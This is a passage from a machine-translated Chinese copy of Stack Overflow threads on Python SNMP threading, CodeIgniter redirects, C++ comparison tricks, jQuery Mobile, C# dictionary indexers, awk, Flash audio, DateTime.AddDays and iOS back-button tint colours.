    oid_loadB = netsnmp.Varbind('.1.3.6.1.4.1.2606.100.1.2.2.1.7.1',2)
    oid_loadC = netsnmp.Varbind('.1.3.6.1.4.1.2606.100.1.2.2.1.7.1',3)

    all_oids = netsnmp.VarList(oid_loadA, oid_loadB, oid_loadC)

    get = list(x.get(all_oids))

    loadA = convert(get[0],0.01)
    loadB = convert(get[1],0.01)
    loadC = convert(get[2],0.01)

    res = 'Host:' + rittal + '\t\tLA:' + loadA + 'A LB:' + loadB + 'A LC:' + loadC + 'A'
    return res

start = time.time()
def main():
    list=[]
    for line in open ("test", "r").readlines():
        for h in line.rstrip('\n').split(' '):
            #print h
            list.append(h)
    x = str(len(list))
    print "Ilosc rittali = " + x
    print list;

  #spawn a pool of threads, and pass them queue instance 
    for i in range(10):
        t = ThreadUrl(queue)
        t.setDaemon(True)
        t.start()

 #populate queue with data   
        for item in list:
            queue.put(item)

 #wait on the queue until everything has been processed     
        queue.join()

main()
print "Elapsed Time: %s" % (time.time() - start) 
```

样本输出：

```
['host1', 'host2', 'host3']
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.50A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.50A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.50A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.50A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.50A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host3      LA:00.75A LB:01.13A LC:09.63A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.63A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.63A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host3      LA:00.75A LB:01.13A LC:09.63A
Host:host1      LA:00.00A LB:00.00A LC:00.38A
Host:host2      LA:00.00A LB:00.00A LC:00.00A
Host:host3      LA:00.75A LB:01.13A LC:09.63A

Elapsed Time: 0.634697914124

# python.py | grep Host | sort | uniq -c
     10 Host:host1      LA:00.00A LB:00.00A LC:00.38A
     10 Host:host2      LA:00.00A LB:00.00A LC:00.00A
      5 Host:host3      LA:00.75A LB:01.13A LC:09.50A
      5 Host:host3      LA:00.75A LB:01.13A LC:09.63A 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-06-12T15:21:56.063

仔细检查你的缩进。

每次初始化一个新的工作线程时，您都会将整个主机列表排入队列。`join()`此外，您可以通过队列来序列化这些线程：

```
for i in xrange(10):
  t = ThreadURL(q)
  ...
  for item in host_list:   # oops
    q.put(item)
  q.join()                 # oops 
```

# codeigniter - 重定向到另一个页面。如何显示倒计时？

> ID：11583585
> 
> 赞同：1
> 
> 时间：2012-07-20T16:40:52.023
> 
> 标签：codeigniter

我只是想知道以下是否可能：我对 JQuery 一无所知，也不知道如何制作自己的 javascript。当用户登录我的网站时，他们会看到一个显示“登录已完成”的页面。在这句话下，我想得到一个倒计时秒数的句子，直到它们被重定向。有没有一种简单的方法可以做到这一点？

我已经有一个倒计时函数：第一次调用该函数时，会加载视图“view_login_success”并将 $data[] 数组传递给它。$data['sec'] 保存应该在屏幕上打印的剩余秒数。当 do-while 循环结束时，用户应该被重定向到主页。发生的事情是，“view_login_success”视图根本没有加载，5 秒后，用户被重定向到主页。

```
function timerIn() {
    $now = time();
    $this->load->view('view_login_success', $this->data);
    do {
        if (time() - $now != 0) {
            $this->data['sec'] = $this->data['sec'] - 1;
            $this->load->view('view_login_success', $this->data);
            $now = time();
        }
    } while ($this->data['sec'] != 1);
    $this->data['sec'] = 5;
    redirect('user/start');
} 
```

这是视图：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Login geslaagd</title>
    <?php $this->load->view('templates/header2'); ?>
</head>
<body>
        <h2  style="text-align: center;"><?php echo strtoupper(substr($this->session->userdata('gebruikersnaam'),0,1));
        echo substr($this->session->userdata('gebruikersnaam'),1); ?>, U bent ingelogd!</h2>
        <p>U word doorverwezen: <?php echo $sec; ?> seconden...</p>
</body>
<?php $this->load->view('templates/footer'); ?> 
```

如果有办法在 Javascript 的 JQuery 中做到这一点，那么请向我解释我应该怎么做才能让它工作。提前致谢！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:57:34.953

这不是 php 的工作方式。

如果您希望页面在 5 秒后重定向，您必须在 JS 代码中这样做。您重定向用户而不将视图发送到客户端。

现在，您只需要等待 5 秒钟即可重定向。所以：

*   显示视图
*   JS 将有计时器，然后重定向。

javascript代码将是这样的：

```
setTimeout(function(){
  window.location.href = 'theURLyouwant';
},5000) 
```

或者你可以使用 ol' 元标记

```
<meta http-equiv="refresh" content="5; URL=theURLyouwant"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-12-13T14:42:20.803

使用代码点火器来解决这个问题。使用此参考类输出。输出类将自动加载。你不需要加载这个。使用此功能设置标题。

```
 $this->output->set_header('refresh:time-to-redirect; url='.site_url("your-url")); 
```

[有关此类的更多详细信息。](https://ellislab.com/codeigniter/user-guide/libraries/output.html)

# c++ - 使用比较运算符时检查多个值

> ID：11583592
> 
> 赞同：13
> 
> 时间：2012-07-20T16:41:21.913
> 
> 标签：c++, operator-overloading, logical-operators, expression-templates

我一直认为对于任何比较语句，即`X == Y`or`X != Y`是格式，并且您将语句与`&&`or链接在一起`||`。

没有什么方法可以`X == (Y || Z)`代替`X == Y || X == Z`吗？

**编辑**：既然已经确定这是不可能干净地做到的，那还能怎么做呢？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T17:12:52.790

```
#include <algorithm>
#include <array>
#include <string>
#include <iostream>
#include <initializer_list>

template<class Type, class Next>
bool is_one_of(const Type& needle, const Next& next)
{return needle==next;}
template<class Type, class Next, class ... Rest>
bool is_one_of(const Type& needle, const Next& next, Rest... haystack)
{return needle==next || is_one_of(needle, haystack...);}

int main() {
    std::string X, Y;
    if (is_one_of(X, Y, "HI"))
        std::cout << "it is!";
    else
        std::cout << "it isn't!";
    return 0;
} 
```

[编译证明](http://ideone.com/UMoj3)。 [Xeo](https://chat.stackoverflow.com/users/500104/xeo)还观察到`std::any_of`， `std::all_of`并且`std::none_of`可能很有用，具体取决于您的实际需求和愿望。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:50:32.347

没有干净的方法可以完成您在 C++ 中提出的要求。

让很多人感到困惑的是，这`X == (Y || Z)`可能是一个合法的表达方式，编译器不会抱怨。这将只是一个错误。每个 C++ 语句必须自行评估为真/假，而运算符只需将它们串在一起。您的建议需要一些内在的列表结构。许多语言都有（比如 Python），但 C++ 没有。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:11:25.863

通过运算符重载，您可能可以获得所需的确切语法。但是，正如亚当指出的那样，这可能会导致排除有效表达式。

下面是一个带有运算符重载的模板、一个模板函数和一个宏，用于实现类似于 Mooing Duck 更好的解决方案的语法，但不需要 C++11，并允许使用`||`运算符来表示“干草堆”集合。

```
template <typename T>
struct MultiOrComparable {
    mutable std::set<T> vals;
    const MultiOrComparable & operator || (T v) const {
        vals.insert(v); return *this;
    }
    bool operator == (T v) const { return vals.find(v) != vals.end(); }
};

template <typename T>
MultiOrComparable<T> MultiOrComparableStart (T) {
    return MultiOrComparable<T>();
}

#define IsOneOf(x, y) ((MultiOrComparableStart(x)||y) == x) 
```

然后，以下程序“工作”：

```
enum Foo { A, B, C, D };

int
main ()
{
    if (!IsOneOf(A, B || C || D)) {
        std::cout << "!=" << std::endl;
    }
    if (IsOneOf('a', 'x' || 'y' || 'z' || 'a')) {
        std::cout << "==" << std::endl;
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T20:04:38.463

[可能有一种方法可以使用表达式模板](https://stackoverflow.com/a/2598596/819272)来实现您想要的。下面是如何处理这个问题的**草图**（不编译，缺少很多细节，警告讲师）。首先，您设置一个类模板来表示逻辑值并在它们上定义一些运算符。

```
template<typename T, typename Type = Atomic<T> >
class Logical;

template<typename T, typename E1, typename E2>
Logical<T, OpOr<T, E1, E2> > operator||(Logical<T, E1> lhs, Logical<T, E2> rhs); 

template<typename T, typename E1, typename E2>
Logical<T, OpAnd<T, E1, E2> > operator&&(Logical<T, E1> lhs, Logical<T, E2> rhs); 

template<typename T, typename E1, typename E2>
Logical<T, OpEq<T, E1, E2> > operator==(Logical<T, E1> lhs, Logical<T, E2> rhs)
{ return OpEq<T, E1, E2>()(lhs, rhs); } // delegate to class template 
```

因为函数模板不能部分特化，所以您将实际工作委托给类模板。

```
// primary template
template<typename T, typename E1, typename E2> class OpEq; 

// specialization for atomic comparisons
template<typename T>
class OpEq<T, Atomic<T>, Atomic<T> >
{
    bool operator()(Atomic<T> lhs, Atomic<T> rhs)
    { return lhs == rhs; }
}

// apply distributive rule
template<typename T>
class OpEq<T, Atomic<T>, OpOr<T, Atomic<T>, Atomic<T> > >
{
    bool operator()(Atomic<T> lhs, OpOr<T, Atomic<T>, Atomic<T> > rhs)
    { return (lhs == rhs.first()) && (lhs == rhs.second()); }
} 
```

显然，要获得所需的自然 C++ 语法，需要使用大量繁重的模板机制。但是通过大量的努力和阅读，您最终可能会得到一些不错的东西。（您必须定义 Atomic、OpAnd、OpOr、设置表示持有子表达式的第一个和第二个分支等等等）

然而，即使你成功了，你的方案中也会出现非常**奇怪的语义**。您所提议的是要求在or`==`上进行**左分配**。即解析`||``&&`

```
X == (Y @OP Z) 
```

作为

```
(X == Y) @OP (X == Z) 
```

`@OP`等于`&&`或`||`。_ 我认为要求`==`保持**对称**是很自然的。这将要求您还施加over和的**右分配**。即解析`==``&&``||`

```
(X @OP Y) == Z 
```

作为

```
(X == Z) @OP (Y == Z) 
```

但是，如果将两者与表达式 as 结合使用，则会出现`(A @OP1 B) == (C @OP2 D)`逻辑上的不一致。例如，结果取决于您应用左分布和右分布的顺序。

**从左到右**：

```
(A @OP1 B) == (C @OP2 D)
((A @OP1 B) == C) @OP2 ((A @OP1 B) == D)
((A == C) @OP1 (B ==C)) @OP2 ((A == D) @OP1 (B == D)) 
```

**从右到左**：

```
(A @OP1 B) == (C @OP2 D)
(A == (C @OP2 D)) @OP1 (B == (C @OP2 D))
((A == C) @OP2 (A == D)) @OP1 ((B == C) @OP2 (B == D)) 
```

在这两种情况下，都在比较相同的 4 对元素，但它们在表达式树上传播的方式略有不同。如果`@OP1`和`@OP2`相同，那么您可以展平整个树并重新排序术语以获得独特的结果。，如果在 的两边使用相同的运算符，就可以了`==`，因为`&&`和`||`都是**关联**的和**可交换**的。

但是对于混合运算符，结果表达式通常会有所不同。

**更新**：如对此答案和其他答案的评论中所述，您还失去了内置类型的某些属性。首先，重载运算符不遵守的短路规则。对于不涉及指针取消引用或其他资源访问（`if(p && p->value())`或`if(file && file.open())`等）的逻辑表达式，这不会影响正确性，而只会影响效率。否则要小心！其次，还提到常量/表达式的混合评估会出错。这有一个简单（但冗长）的修复：只需使用`std::integral_constant`(or `boost::mpl::int_`) 作为包装器。

# jquery - 如何成功使用 data-wrapperels="div"

> ID：11583593
> 
> 赞同：1
> 
> 时间：2012-07-20T16:41:24.020
> 
> 标签：jquery, jquery-mobile, html

我在某处读到它`data-wrapperels`是由提供的，`JQM`以允许开发人员选择为层次结构生成的容器。我再也找不到这个参考，也找不到关于这个属性的任何特定文档。

我使用`data-wrapperels`来请求 JQM 使用跨度的 div 实例，但是，JQM 覆盖了此规范并重置为“跨度”。

任何帮助将不胜感激。

问候。

这是代码：

```
<a id="myhomebutton" 
   href="index.html" 
   data-iconpos="notext" 
   data-wrapperels="div" 
   data-corners="false" 
   data-role="button"></a> 
```

这就是我要结束的（在 JQM 处理其化学之后）：

```
<a id="myhomebutton" 
   href="index.html" 
   data-iconpos="notext" 
   data-corners="false" 
   data-role="button" 
   class="ui-btn-left..." 
   data-shadow="true" 
   data-iconshadow="true" 
   data-wrapperels="span" 
   data-theme="a" title="">

   <span class="ui-btn-inner">

      <span class="ui-btn-text"></span>

   </span>
</a> 
```

# c# - 如何为字典编写 getter 和 setter？

> ID：11583595
> 
> 赞同：23
> 
> 时间：2012-07-20T16:41:36.777
> 
> 标签：c#, dictionary, getter-setter

如何为字典等复杂数据类型定义 getter 和 setter？

```
public Dictionary<string, string> Users
{
    get
    {
        return m_Users;
    }

    set
    {
        m_Users = value;
    }
} 
```

这会返回整个字典？您能否编写 setter 来查看是否存在特定的键值对，如果不存在，请添加它。否则更新当前的键值对？对于get，你能返回一个特定的键值对而不是整个字典吗？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-07-20T16:53:35.163

使用索引器属性 ( [MSDN](http://msdn.microsoft.com/en-us/library/6x16t2tx.aspx) )：

```
public class YourClass
{
    private readonly IDictionary<string, string> _yourDictionary = new Dictionary<string, string>();

    public string this[string key]
    {
        // returns value if exists
        get { return _yourDictionary[key]; }

        // updates if exists, adds if doesn't exist
        set { _yourDictionary[key] = value; }
    }
} 
```

然后像这样使用：

```
var test = new YourClass();
test["Item1"] = "Value1"; 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-07-20T16:47:22.233

不可能以仅涉及属性的方式进行。*理论上*您可以编写一个 setter，但对于 getter，您需要指定一个要检索的键。这是不可能的，因为属性不接受参数。完成您想要的自然方法是使用方法：

```
private Dictionary<string, string> users = new Dictionary<string, string>();

public void Set(string key, string value)
{
    if (users.ContainsKey(key))
    {
        users[key] = value;
    }
    else
    {
        users.Add(key, value);
    }
}

public string Get(string key)
{
    string result = null;

    if (users.ContainsKey(key))
    {
        result = users[key];
    }

    return result;
} 
```

或者，正如其他人已经说过的那样，您可以使用索引器，但我一直觉得它们有点麻烦。但我想这只是个人喜好问题。

只是为了完整起见，这就是 setter 的样子，尽管拥有这样的属性是非常不寻常且违反直觉的：

```
public KeyValuePair<string, string> Users
{
    set
    {
        Set(value.Key, value.Value);
    }
} 
```

在内部，它使用`Set`我之前的代码片段中的方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:44:06.347

您将无法使用属性来做到这一点。您需要为此使用方法，或者将索引器添加到您的类中。该`get`方法不能接受参数（键）。

另一种选择是，如果您希望某人能够轻松地向字典添加/删除键但阻止他们设置全新的键，则将属性设为只读属性，该属性返回在构造函数中创建的字典。它不如添加 get/set 方法灵活，但在常见的简单情况下，它可以做得很好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T16:44:40.893

看起来你想要一个“命名索引器”。这是（我的）使用 C# 完成此任务的[一种方法。](http://codeblocks.codeplex.com/wikipage?title=Indexable%20sample&referringTitle=Home)

我的方法公开了一个属性，该属性返回一个对象（带有默认索引器），该对象将在给定 lambda 的情况下执行对适当字段的索引。

您可能有或不想使用此方法的原因，但我将把它留给您。:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T16:49:43.280

使用 setter 可以做到这*一点，但非常不推荐，而使用 getter 则完全不可能，因为它不需要参数来确定要获取的内容。*

对于 setter，您必须`Dictionary<string, string>`使用一对传递 a ，但这与您期望 getter/setter 通常做的事情背道而驰，并完全阻止您设置整个 Dictionary。

更好的方法是使用一对方法，如果您愿意，可以将它们命名为 Get 和 Set。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-04-07T11:52:39.533

```
Dictionary<string, string> param = new Dictionary<string, string>();

public void SetYourParameter(string parametrName, string paramValue)
{
    param[parametrName] = paramValue;            
}

public string GetYourParameter(string parametrName)
{
    // ContainKey ---> It returns value if the key was found
    if( param.ContainsKey(parametrName))
        return param[parametrName];
    else
        return null;
} 
```

# linux - Ubuntu从文本文件中获取句子中的最后一个单词

> ID：11583598
> 
> 赞同：2
> 
> 时间：2012-07-20T16:41:44.653
> 
> 标签：linux, shell, unix, ubuntu

我有一个制表符分隔的文本文件，其结构如下：

```
word0  word1  word2  word3  word4  word5  word6 
```

从 linux commond 行我想：

1.  只获取word6
2.  如何在 word6 中只获得字符 ord6？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-20T16:51:36.473

AWK 可以做到这一点：

```
 $ echo "word0 word1 word2 word3 word4 word5 word6" | awk '{ print $(NF) }'
 word6 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T21:35:03.623

```
string=$(echo "word0 word1 word2 word3 word4 word5 word6" | awk '{ print $(NF) }')
echo ${string:3:4}  # echo substring starting at postion3, 4 characters long i.e. ord6 
```

或者

```
echo ${string[@]#w} # removes the shortest possible match for the regex 
                    # (i.e. w) at the start of the string 
```

## 最长匹配，% & %% 删除字符串的后面

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:14:40.947

您可以使用`cut`给定的简单命令：
`$cut -d'Press CTRL+v then TAB key to insert tab as delim here' -f6 textfile|cut -c2-
ord6
$`

有关更多信息，请查看 cut 命令的手册页。

当然，还有很多其他方法可以做同样的工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T17:55:14.253

**尝试这个**

```
awk -F "\t" '{print $NF}' Input.txt 
```

根据需要更改分隔符。

# flash - 音乐不在本地或在线以 .swf 格式播放，但在通过 Flash® 观看时播放

> ID：11583600
> 
> 赞同：0
> 
> 时间：2012-07-20T16:41:48.440
> 
> 标签：flash, background-music

我使用我在网上找到的以下脚本（AS3）在我的闪存中播放音乐。我不知道动作脚本。

```
//imports the necessary as events
import flash.events.Event
import flash.events.MouseEvent;

var isPlaying:Boolean = new Boolean();
var pausePosition:Number = new Number();

//Create an instance of the Sound class
var soundClip:Sound = new Sound();
//Create a new SoundChannel Object
var sndChannel:SoundChannel = new SoundChannel();

//Load sound using URLRequest
soundClip.load(new URLRequest("music.mp3"));
//Create an event listener that wll update once sound has finished loading
soundClip.addEventListener(Event.COMPLETE, onComplete, false, 0, true);

music_play.addEventListener(MouseEvent.MOUSE_DOWN, btnPressController, false, 0, true);
music_stop.addEventListener(MouseEvent.MOUSE_DOWN, btnPressStop, false, 0, true);

function onComplete(evt:Event):void {
    //Play loaded sound
    sndChannel = soundClip.play();
    isPlaying = true;
}

function btnPressController(evt:MouseEvent):void
{
    switch(isPlaying)
    {
        case true:
            music_play.gotoAndStop(2);
            pausePosition = sndChannel.position; 
            sndChannel.stop();
            isPlaying = false;
        break;
        case false:
            music_play.gotoAndStop(1);
            sndChannel = soundClip.play(pausePosition);
            isPlaying = true;
        break;
    }
}

function btnPressStop(evt:MouseEvent):void
{
    pausePosition = 0;
    sndChannel.stop();
    music_play.gotoAndStop(2);
    isPlaying = false;
} 
```

正如您在上面的脚本中看到的，是播放`music_play`和`music_stop`停止按钮的实例名称。.mp3 文件在加载时应该播放音乐，但只有当我从 Flash 中查看时才会播放音乐。但是当我在本地或在线 (http://ulfhc.com.au/) 观看时，音乐无法播放。我确定这不是因为 .swf 或 .mp3 文件的位置。

你能帮我解决这个问题吗？

非常感谢。

**编辑：**

那么新代码会是这样吗？

```
import flash.events.Event
import flash.events.MouseEvent;

var isPlaying:Boolean = new Boolean();
var pausePosition:Number = new Number();

var soundClip:Sound;

function init() {
    soundClip = new Sound();
    soundClip.load(new URLRequest("music.mp3"));
    soundClip.addEventListener(Event.COMPLETE, soundLoaded);
    soundClip.addEventListener(ProgressEvent.PROGRESS, soundLoading);
    music_play.addEventListener(MouseEvent.MOUSE_DOWN, btnPressController, false, 0, true);
    music_stop.addEventListener(MouseEvent.MOUSE_DOWN, btnPressStop, false, 0, true);
}
init();

function onComplete(evt:Event):void {
    sndChannel = soundClip.play();
    isPlaying = true;
}

function soundLoaded(e:Event) {
    soundClip.play();
}

function soundLoading(e:ProgressEvent) {
    // preloader information goes here
}

function btnPressController(evt:MouseEvent):void
{
    switch(isPlaying)
    {
        case true:
            music_play.gotoAndStop(2);
            pausePosition = sndChannel.position; 
            sndChannel.stop();
            isPlaying = false;
        break;
        case false:
            music_play.gotoAndStop(1);
            sndChannel = soundClip.play(pausePosition);
            isPlaying = true;
        break;
    }
}

function btnPressStop(evt:MouseEvent):void
{
    pausePosition = 0;
    sndChannel.stop();
    music_play.gotoAndStop(2);
    isPlaying = false;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T19:28:00.630

根据本地/网络访问，确保 Flash 发布设置“本地播放安全”设置为“仅访问网络”而不是“仅访问本地文件”

还要确保您的路径与托管部署的环境相匹配。如果您引用“music.mp3”作为 URL，则“music.mp3”必须与您发布的 SWF 位于同一位置。

每预加载 mp3 而不是流式传输，请`Event.COMPLETE`在调用`play()`您的声音之前收听：

```
var soundClip:Sound;

function init() {
    soundClip = new Sound();
    soundClip.load(new URLRequest("<path to sound file>"));
    soundClip.addEventListener(Event.COMPLETE, soundLoaded);
    soundClip.addEventListener(ProgressEvent.PROGRESS, soundLoading);
}
init();

function soundLoaded(e:Event) {
    soundClip.play();
}

function soundLoading(e:ProgressEvent) {
    // preloader information goes here
} 
```

如果您不需要流式传输 mp3，您也可以将其嵌入到库中：

![声音剪辑](../Images/3b4b7d3a0db98695ce986e1c8c657e46.png)

声音可以通过以下方式播放：

```
var soundClip:Sound = new SoundClip(); 
soundClip.play(); 
```

# c# - DateTime.AddDays() 没有按预期工作

> ID：11583601
> 
> 赞同：22
> 
> 时间：2012-07-20T16:41:49.363
> 
> 标签：c#, visual-studio-2010, datetime

我有这个简单的程序：

```
 DateTime aux = new DateTime(2012, 6, 12, 12, 24, 0);
        DateTime aux2 = new DateTime(2012, 6, 12, 13, 24, 0);
        aux2.AddDays(1);

       Console.WriteLine((aux2 - aux).TotalHours.ToString());

        Console.ReadLine(); 
```

我对此进行了调试，发现`aux2.AddDays(1);`似乎不起作用，我在这里缺少什么？它应该返回 25，但答案是 1。

问题是什么？

也`AddHours`不起作用，我想其他人也不起作用。

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-07-20T16:43:21.693

它确实有效，但您不对返回值做任何事情，请尝试

```
aux2 = aux2.AddDays(1); 
```

`DateTime`s 与 s 共享不变性这一方面`String`。

* * *

**编辑**

[MSDN](http://msdn.microsoft.com/en-us/library/system.datetime.adddays.aspx)上有一段关于它的小段

> 此方法不会更改此 DateTime 的值。相反，它返回一个新的 DateTime，其值是此操作的结果。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-20T16:43:31.587

`DateTime.AddDays`返回添加指定天数的新 DateTime。您需要将其分配给您的变量：

```
aux2 = aux2.AddDays(1); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-09T11:01:20.277

# 您正在使用不可变函数。

DateTime 函数是不可变的，一旦你设置变量等于它，它就不能改变，你可以设置新的变量等于函数的工作。AddDay 函数接受您放入其中的变量，但它不会更改保持不变的原始变量。所以你需要设置一个新变量等于原始变量+一天。

所以你真正需要做的就是改变

`aux2.AddDays(1);`

到

`aux2 = aux2.Adddays(1);`

然后其余的比较功能应该可以工作

# iphone - iPhone设置后栏按钮项目的色调颜色

> ID：11583603
> 
> 赞同：18
> 
> 时间：2012-07-20T16:41:54.523
> 
> 标签：iphone, xcode, uibarbuttonitem, backbarbuttonitem

我正在尝试在导航控制器中设置后退按钮的色调，但没有任何效果。我努力了

```
[self.navigationController.backBarButtonItem setTintColor:myColor];
//myColor was previously set 
```

但它保持默认色调

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-07-20T17:48:29.907

我相信 barButtonItem 是只读的。（我不太清楚，如果我错了，请有人纠正我）

为了给这些按钮着色，我会这样做：

在您的 App Delegate 中，添加以下代码行：

```
UIBarButtonItem *barButtonAppearance = [UIBarButtonItem appearance];
[barButtonAppearance setTintColor:[UIColor redColor]]; // Change to your colour 
```

第一行设置了一个外观代理，所以我相信这也可以，如果你喜欢更少的代码：

```
[[UIBarButtonItem appearance] setTintColor:[UIColor redColor]]; 
```

我希望这对你有用！（这会改变 UIBarButtonItem 的所有实例）

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2012-07-20T22:07:58.247

您不能直接更改 UINavigationItem 的色调颜色。您必须更改导航栏的色调颜色，您的栏按钮将自动更改其颜色。

在您的 viewWillAppear 方法中添加这些行

```
[[self.navigationController navigationBar] tintColor] = [UIColor myColor]; 
```

或者您可以创建一个自定义按钮并将您的 UIBarButtonItem 初始化为

```
UIBarButtonItem *barButtonItem = [[UIBarButtonItem alloc] initWithCustomView:yourUIButton]; 
```

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2014-01-11T14:25:19.863

这对我有用。

```
[self.navigationController.navigationBar setTintColor:[UIColor redColor]]; 
```

这与第二个答案非常相似......

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-02-26T16:04:14.727

如果您更喜欢在 Interface Builder 中执行此操作而不编写代码：

1.  选择您的 UINavigationBar（在 UINavigationController 内）

[![在此处输入图像描述](../Images/74bc5e6f2d9ea24c405b5793048748e4.png)](https://i.stack.imgur.com/PHXnQ.png)

2.  在 Attributes Inspector 中，找到“Tint”——这就是设置后退按钮颜色的原因。请注意，“Bar Tint”不一样 - 这会设置导航栏背景颜色。

[![在此处输入图像描述](../Images/38929111a26743492393c38548735b84.png)](https://i.stack.imgur.com/SQCUI.jpg)

以这种方式设置后退按钮外观很重要，而不是尝试实现 leftBarButtonItem，因为实现 leftBarButtonItem 将禁用内置的后退导航手势，如滑动返回。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-11-10T18:36:04.133

快捷方式：

它会更改导航中的所有项目。

在 AppDelegate 中执行以下操作：

```
let navControl = UINavigationBar.appearance()
    navControl.tintColor = UIColor.grayColor() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-12-22T13:03:17.787

它总是对我有用：

1.  `self.navigationItem.leftBarButtonItem = [self logicToAddBackButton];`

2.  获取默认返回按钮

-

```
(UIBarButtonItem*) logicToAddBackButton
        {
            UIImageView *imageView;

            // [imageView setTintColor:[UIColor redColor]];
            UILabel *label=[[UILabel alloc] init];
            if (WHITEBACK) {
                imageView  =[[UIImageView alloc] initWithImage:[UIImage imageNamed:@"UiNavigationBackIPAD"]];
                [label setTextColor:[UIColor whiteColor]];
            }else{ //DEFAULTBACK
                imageView  =[[UIImageView alloc] initWithImage:[UIImage imageNamed:@"UiNavigationBack"]];
                [label setTextColor:[UIColor colorWithRed:0.0 green:122.0/255.0 blue:1.0 alpha:1.0]];

            }

            [label setText:@"Back"];
            [label sizeToFit];

            int space=6;
            label.frame=CGRectMake(imageView.frame.origin.x+imageView.frame.size.width+space,
    label.frame.origin.y, label.frame.size.width,
    label.frame.size.height);
            UIView *view=[[UIView alloc] initWithFrame:CGRectMake(0, 0, label.frame.size.width+imageView.frame.size.width+space,
    imageView.frame.size.height)];

            view.bounds=CGRectMake(view.bounds.origin.x+8, view.bounds.origin.y-1, view.bounds.size.width,
    view.bounds.size.height);

            UIButton *button=[[UIButton alloc] initWithFrame:CGRectMake(view.bounds.origin.x, view.bounds.origin.y,
    view.bounds.size.width, view.bounds.size.height)];
            button.bounds=CGRectMake(view.bounds.origin.x, view.bounds.origin.y, view.bounds.size.width,
    view.bounds.size.height);
            [button addTarget:self action:@selector(eventBack) forControlEvents:UIControlEventTouchUpInside];
            [button addSubview:imageView];
            [button addSubview:label];

            [UIView animateWithDuration:0.33 delay:0 options:UIViewAnimationOptionCurveLinear animations:^{
                label.alpha = 0.0;
                CGRect orig=label.frame;
                label.frame=CGRectMake(label.frame.origin.x+25, label.frame.origin.y -5, label.frame.size.width,
    label.frame.size.height+10);
                label.alpha = 1.0;
                label.frame=orig;
            } completion:nil];

            UIBarButtonItem *backButton =[[UIBarButtonItem alloc] initWithCustomView:button];

            return backButton;
        } 
```

*   返回按钮操作

    (void)eventBack { [self.navigationController popViewControllerAnimated:YES]; }

*   UiNavigationBack Image（请根据需要更改图像的颜色，尺寸相同 [25X41 144pixels/inch] 以获得默认外观） ![在此处输入图像描述](../Images/c9ba2ccce51e03847596fb4e9267e6de.png)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-20T10:13:40.587

好吧，您当然可以仅更改后退按钮或导航栏上的任何条形按钮的颜色。这是一个小片段。

```
UIBarButtonItem *backButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonItemStylePlain target:self action:nil];
backButton.tintColor = [UIColor blackColor];
[self.navigationItem setBackBarButtonItem:backButton];
[backButton release]; 
```

好吧，这只是其中一种方法。我希望这有帮助！！我知道它的答案已经被接受，但我想给它一个适当的片段。干杯！！！编码快乐！！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-08-01T07:14:20.533

将以下代码放在 AppDelegate 中，它将全局设置后退按钮的颜色

```
//Set color of BackButtonItem globally

[[UIBarButtonItem appearance] setTintColor:[UIColor colorWithRed:5.0/255.0 
green:127.0/255.0 blue:173.0/255.0 alpha:1.0]]; 
```

这在 iOS 5 及更高版本中受支持

* * *

## 回答 #9

> 赞同：0
> 
